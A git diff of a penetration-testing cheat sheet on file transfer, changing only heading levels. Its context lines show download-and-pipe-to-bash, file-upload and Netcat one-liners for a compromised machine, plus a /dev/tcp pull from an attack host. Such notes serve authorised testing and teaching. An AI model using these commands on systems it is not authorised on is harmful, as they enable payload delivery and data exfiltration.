@@ -210,7 +210,7 @@ Uploading files using SMB WebDAV
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
 ```
 # Transferring with Code
-# Python - Download
+## Python - Download
 Python2 Download
 ```bash
 python2.7 -c 'import urllib;urllib.urlretrieve ("<URL>", "<Saved_File_Name")'
@@ -219,7 +219,7 @@ Python3 Download
 ```bash
 python3 -c 'import urllib.request;urllib.request.urlretrieve("<URL>", "<Saved_File_Name")'
 ```
-# Python - Upload
+## Python - Upload
 Start UploadServer
 ```bash
 python3 -m uploadserver
@@ -228,7 +228,7 @@ Python upload one-liner
 ```bash
 python3 -c 'import requests;requests.post("<Upload_URL>",files={"files":open("<Local_File_to_Upload","rb")})'
 ```
-# PHP - Download
+## PHP - Download
 PHP Download w/ File_get_contents()
 ```bash
 php -r '$file = file_get_contents("<URL>"); file_put_contents("<Saved_File_Name>",$file);'
@@ -241,15 +241,15 @@ PHP Download and Pipe to Bash
 ```bash
 php -r '$lines = @file("<URL>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
-# Ruby - Download
+## Ruby - Download
 ```bash
 ruby -e 'require "net/http"; File.write("<Saved_File_Name>", Net::HTTP.get(URI.parse("<URL>")))'
 ```
-# Perl - Download
+## Perl - Download
 ```bash
 perl -e 'use LWP::Simple; getstore("<URL>", "<Saved_File_Name");'
 ```
-# Javascript - Download
+## Javascript - Download
 Create wsget.js
 ```javascript
 var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
@@ -265,7 +265,7 @@ From CMD or PowerShell
 ```powershell
 cscript.exe /nologo wget.js <URL> <Output_File_Name>
 ```
-# VBScript - Download
+## VBScript - Download
 Create wget.vbs
 ```vbscript
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
@@ -285,7 +285,7 @@ From CMD or PowerShell
 cscript.exe /nologo wget.vbs <URL>  <OutFile>
 ```
 # Misc File Transfer Methods
-# Transfer w/ Netcat
+## Transfer w/ Netcat
 Compromised machine
 ```bash
 # OG Netcat
@@ -315,7 +315,7 @@ Connecting to Netcat using /dev/tcp to Receive the file
 ```bash
 cat < /dev/tcp/<Attack_Host_IP>/<port> > <Outfile>
 ```
-# PowerShell Session File Transfer
+## PowerShell Session File Transfer
 Enabling powershell remoting opns ports 5986/HTTP & 5986/HTTPS
 Must be administrator, Remote Management Users member, or have explicit permissions
 Create a Powershell Session
@@ -327,7 +327,7 @@ Copy-Item -Path <Local_File> -ToSession $Session -Destination <Destination_File_
 # Copy File from computer w/ Session Object
 Copy-Item -Path "<Remote_File_Path\Name>" -Destination <Local_Path> -FromSession $Session
 ```
-# RDP
+## RDP
 Mounting a Linux Folder using rdesktop
 ```bash
 rdesktop <Target_IP> -d <domain> -u <user> -p <password> -r disk:linux='Local_Folder'
